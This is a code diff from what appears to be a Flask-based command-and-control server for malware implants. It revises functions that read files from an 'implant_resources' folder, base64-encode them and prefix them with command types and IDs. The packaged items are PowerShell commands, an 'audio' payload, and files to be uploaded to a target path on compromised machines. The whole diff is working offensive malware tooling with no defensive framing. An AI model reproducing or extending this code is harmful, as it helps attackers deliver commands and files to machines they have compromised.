@@ -14,12 +14,16 @@ app.config['SECRET_KEY'] = str(uuid4())
 
 
 # Adding the functions which manage encoding built in commands for transfer
-def craft_sound_file(path):
+def craft_sound_file(value_dict, command_id):
     print("Crafting audio file")
-
+    path = f"{os.getcwd()}/Storage/implant_resources/{value_dict['args']}"
+    print(f"Opening: {path}")
     with open(path, 'rb') as file:
-        audio = "PS".encode()+base64.b64encode(file.read())
-    return audio
+        # audio = base64.b64encode(file.read()).decode()
+        audio = base64.standard_b64encode(file.read()).decode()
+        print(audio)
+        final_audio = f"{value_dict['type']}{command_id}{audio}"
+    return final_audio
 
 
 def craft_powershell_native_command(args, command_id):
@@ -30,16 +34,16 @@ def craft_powershell_native_command(args, command_id):
 
 def craft_file_upload(value_dict, command_id):
     # Temp dev work:
-    #
-    a = value_dict['args'].split(" ")
-    local_file = a[0]
-    target_location = a[0]
-    with open (os.getcwd()+"/Storage/implant_resources/"+local_file) as file_h:
+    arg_dict = value_dict['args'].split(" ")
+    local_file = arg_dict[0]
+    target_location = arg_dict[1]
+    with open (os.getcwd()+"/Storage/implant_resources/"+local_file, 'rb') as file_h:
         a = file_h.read()
-        b = base64.b64encode(a.encode()).decode()
+        b = base64.b64encode(a).decode()
         final_str = base64.b64encode(target_location.encode()).decode()+"::"+b
-    # return str(value_dict['type'] + command_id)
-    return final_str
+        final_str = base64.b64encode(final_str.encode()).decode()
+    cc = str(value_dict['type'] + command_id) + final_str
+    return cc
 
 
 def craft_file_download(value_dict, command_id):
